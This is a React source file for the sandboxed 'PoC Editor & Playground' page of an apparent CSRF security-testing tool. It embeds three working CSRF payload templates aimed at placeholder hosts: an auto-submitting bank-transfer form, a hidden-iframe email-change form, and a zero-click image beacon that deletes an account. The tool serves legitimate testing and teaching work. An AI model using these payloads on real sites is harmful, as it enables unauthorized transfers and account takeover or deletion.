import { useState, useEffect, useMemo, useRef } from 'react';
import {
  PlayCircle,
  RotateCcw,
  Download,
  Trash2,
  Terminal,
  ShieldCheck,
  Sparkles,
  Layers,
  Activity,
} from 'lucide-react';
import { useApp } from '../context';
import { instrumentPocForSandbox, PlaygroundLogEvent } from '../lib/playground';
import { Card, CardHeader, CardTitle, CardDescription } from '../components/ui/Card';
import { Button } from '../components/ui/Button';
import { Badge } from '../components/ui/Badge';
import { Alert } from '../components/ui/Alert';

const DEFAULT_POC = `<!DOCTYPE html>
<html>
<head>
  <title>CSRF Demonstration</title>
</head>
<body style="font-family: sans-serif; padding: 20px; text-align: center;">
  <h3>CSRF PoC Execution Sandbox</h3>
  <p>Target: <code>https://vulnerable-bank.internal/transfer</code></p>
  <form id="csrf_form" action="https://vulnerable-bank.internal/transfer" method="POST">
    <input type="hidden" name="recipient" value="attacker_wallet_99" />
    <input type="hidden" name="amount" value="5000" />
    <button type="submit" style="padding: 8px 16px; cursor: pointer;">Execute Transfer</button>
  </form>
  <script>
    console.log("PoC script loaded. Dispatching auto-submit...");
    document.getElementById('csrf_form').submit();
  </script>
</body>
</html>`;

const PLAYGROUND_TEMPLATES = [
  {
    id: 'tpl-auto-form',
    name: 'Auto-Submit HTML Form',
    code: DEFAULT_POC,
  },
  {
    id: 'tpl-stealth-iframe',
    name: 'Stealth Hidden Iframe Form',
    code: `<!DOCTYPE html>
<html>
<body>
  <h3>Stealth CSRF (Hidden Target Iframe)</h3>
  <iframe name="stealth_sink" style="display:none;"></iframe>
  <form id="stealth_form" action="https://target.local/api/profile/update" method="POST" target="stealth_sink">
    <input type="hidden" name="email" value="hacker@evil.corp" />
  </form>
  <script>
    console.log("Dispatching hidden iframe exploit...");
    document.getElementById('stealth_form').submit();
  </script>
</body>
</html>`,
  },
  {
    id: 'tpl-image-beacon',
    name: 'Zero-Click Image Beacon',
    code: `<!DOCTYPE html>
<html>
<body>
  <h3>Zero-Interaction GET Beacon</h3>
  <p>Triggered on image tag load:</p>
  <img src="https://target.local/api/account/delete?confirm=true" width="1" height="1" style="display:none;" onerror="console.log('Image beacon dispatched to target.')" />
</body>
</html>`,
  },
];

export function PlaygroundPage() {
  const { generatedPocs } = useApp();

  // Load initial code from active session or generated PoC or default
  const initialCode = useMemo(() => {
    try {
      const activePocStr = sessionStorage.getItem('csrf_forge_active_poc');
      if (activePocStr) {
        const activePoc = JSON.parse(activePocStr);
        if (activePoc && activePoc.code && !activePoc.code.startsWith('#!')) {
          return activePoc.code;
        }
      }
      if (generatedPocs.length > 0 && generatedPocs[0]?.code && !generatedPocs[0].code.startsWith('#!')) {
        return generatedPocs[0].code;
      }
    } catch {
      // fallback
    }
    return DEFAULT_POC;
  }, [generatedPocs]);

  const [code, setCode] = useState(initialCode);
  const [logs, setLogs] = useState<PlaygroundLogEvent[]>([]);
  const [key, setKey] = useState(1); // Force re-render iframe
  const iframeRef = useRef<HTMLIFrameElement>(null);

  // Listen to postMessage telemetry from the sandboxed iframe
  useEffect(() => {
    const handleMessage = (event: MessageEvent) => {
      if (event.data && event.data.source === 'csrf-forge-sandbox') {
        const newEvent: PlaygroundLogEvent = {
          id: `log_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
          type: event.data.type || 'system',
          message: event.data.message || 'Telemetry event',
          details: event.data.details,
          timestamp: event.data.timestamp || Date.now(),
        };
        setLogs((prev) => [newEvent, ...prev.slice(0, 99)]);
      }
    };

    window.addEventListener('message', handleMessage);
    return () => window.removeEventListener('message', handleMessage);
  }, []);

  const instrumentedSrcDoc = useMemo(() => {
    return instrumentPocForSandbox(code);
  }, [code]);

  const handleRun = () => {
    setKey((prev) => prev + 1);
  };

  const handleClearLogs = () => {
    setLogs([]);
  };

  const handleReset = () => {
    setCode(DEFAULT_POC);
    setKey((prev) => prev + 1);
    setLogs([]);
  };

  const handleLoadTemplate = (tplCode: string) => {
    setCode(tplCode);
    setKey((prev) => prev + 1);
    setLogs([]);
  };

  const handleDownload = () => {
    const blob = new Blob([code], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'csrf_playground_poc.html';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  return (
    <div className="space-y-6 max-w-7xl mx-auto">
      {/* Title */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-2.5">
            <h2 className="text-xl font-bold text-dark-100">PoC Editor & Playground</h2>
            <Badge severity="secure" size="sm" variant="glow">
              SANDBOX ISOLATED
            </Badge>
          </div>
          <p className="text-xs text-dark-400 mt-1 font-mono">
            LIVE RUNTIME SIMULATION • EVENT CAPTURE • ZERO HOST LEAKAGE
          </p>
        </div>

        <div className="flex items-center gap-2">
          <Button
            variant="secondary"
            size="sm"
            onClick={handleDownload}
            leftIcon={<Download className="w-3.5 h-3.5" />}
          >
            Export HTML
          </Button>
          <Button
            variant="primary"
            size="sm"
            onClick={handleRun}
            leftIcon={<PlayCircle className="w-3.5 h-3.5" />}
          >
            Run Sandbox
          </Button>
        </div>
      </div>

      {/* Security Isolation Notice */}
      <Alert type="success" title="Isolated Origin Sandbox (origin: null)">
        This playground executes code inside a strictly restricted iframe (<code>sandbox="allow-scripts allow-forms"</code>). The <code>allow-same-origin</code> flag is purposefully omitted to ensure that host application cookies, tokens, and storage remain completely unreachable.
      </Alert>

      {/* Split Workspace */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 items-start">
        {/* Left Pane: Code Editor */}
        <Card className="space-y-4">
          <CardHeader>
            <div className="flex items-center gap-2">
              <CardTitle className="text-sm">
                <Terminal className="w-4 h-4 text-cyber-400" />
                Exploit Code Editor
              </CardTitle>
            </div>

            <div className="flex items-center gap-2">
              <select
                aria-label="Load pre-built PoC playground template"
                onChange={(e) => {
                  const tpl = PLAYGROUND_TEMPLATES.find((t) => t.id === e.target.value);
                  if (tpl) handleLoadTemplate(tpl.code);
                }}
                className="bg-dark-950 border border-dark-800 text-dark-300 text-xs rounded px-2 py-1 focus:outline-none focus:border-cyber-500/50"
              >
                <option value="">Load Template...</option>
                {PLAYGROUND_TEMPLATES.map((t) => (
                  <option key={t.id} value={t.id}>
                    {t.name}
                  </option>
                ))}
              </select>

              <Button
                variant="ghost"
                size="sm"
                onClick={handleReset}
                title="Reset to default code"
              >
                <RotateCcw className="w-3.5 h-3.5" />
              </Button>
            </div>
          </CardHeader>

          <div className="space-y-2">
            <textarea
              aria-label="Exploit code editor"
              value={code}
              onChange={(e) => setCode(e.target.value)}
              rows={18}
              className="w-full bg-dark-950 border border-dark-800 rounded-lg p-3 font-mono text-xs text-dark-200 placeholder-dark-600 focus:outline-none focus:border-cyber-500/50 transition-colors leading-relaxed selection:bg-cyber-500/30"
              spellCheck={false}
            />

            <div className="flex items-center justify-between text-[11px] text-dark-500 font-mono">
              <span className="flex items-center gap-1.5">
                <Sparkles className="w-3.5 h-3.5 text-cyber-400" />
                Live edits compile and run on clicking "Run Sandbox".
              </span>
              <span>{code.length} characters</span>
            </div>
          </div>
        </Card>

        {/* Right Pane: Runtime Sandbox & Telemetry Log */}
        <div className="space-y-6">
          {/* Iframe Container */}
          <Card glow className="overflow-hidden space-y-3">
            <CardHeader className="mb-0 pb-2">
              <div>
                <CardTitle className="text-sm">
                  <ShieldCheck className="w-4 h-4 text-cyber-400" />
                  Isolated Sandbox View
                </CardTitle>
                <CardDescription>Rendered DOM output</CardDescription>
              </div>

              <Badge severity="secure" size="sm">
                SANDBOXED
              </Badge>
            </CardHeader>

            <div className="border border-dark-800 rounded-lg bg-white overflow-hidden shadow-inner h-56 relative">
              <iframe
                key={key}
                ref={iframeRef}
                title="CSRF PoC Sandbox Runtime"
                srcDoc={instrumentedSrcDoc}
                sandbox="allow-scripts allow-forms"
                className="w-full h-full border-0 bg-white"
              />
            </div>
          </Card>

          {/* Live Telemetry / Event Log */}
          <Card className="space-y-3">
            <CardHeader className="mb-0 pb-2">
              <div className="flex items-center gap-2">
                <CardTitle className="text-sm">
                  <Activity className="w-4 h-4 text-cyber-400" />
                  Runtime Event Interceptor
                </CardTitle>
                <Badge size="sm">{logs.length} EVENTS</Badge>
              </div>

              {logs.length > 0 && (
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={handleClearLogs}
                  leftIcon={<Trash2 className="w-3 h-3 text-red-400" />}
                >
                  Clear Log
                </Button>
              )}
            </CardHeader>

            <div className="h-52 overflow-y-auto space-y-2 p-1 font-mono text-xs">
              {logs.length === 0 ? (
                <div className="h-full flex flex-col items-center justify-center text-center text-dark-500">
                  <Layers className="w-6 h-6 mb-1 text-dark-600" />
                  <p>Awaiting runtime events...</p>
                  <p className="text-[10px] mt-0.5">Form submits, fetch calls, and console logs appear here</p>
                </div>
              ) : (
                logs.map((log) => (
                  <div
                    key={log.id}
                    className="p-2.5 rounded bg-dark-950 border border-dark-800 space-y-1 hover:border-dark-700 transition-colors"
                  >
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <Badge
                          severity={
                            log.type === 'form-submit'
                              ? 'critical'
                              : log.type === 'network-call'
                              ? 'high'
                              : log.type === 'error'
                              ? 'high'
                              : 'info'
                          }
                          size="sm"
                        >
                          {log.type.toUpperCase()}
                        </Badge>
                        <span className="text-dark-200 font-semibold">{log.message}</span>
                      </div>
                      <span className="text-[10px] text-dark-500">
                        {new Date(log.timestamp).toLocaleTimeString()}
                      </span>
                    </div>

                    {log.details && (
                      <pre className="p-2 bg-dark-900 rounded border border-dark-800/60 text-[11px] text-dark-300 overflow-x-auto whitespace-pre-wrap">
                        {typeof log.details === 'object'
                          ? JSON.stringify(log.details, null, 2)
                          : String(log.details)}
                      </pre>
                    )}
                  </div>
                ))
              )}
            </div>
          </Card>
        </div>
      </div>
    </div>
  );
}
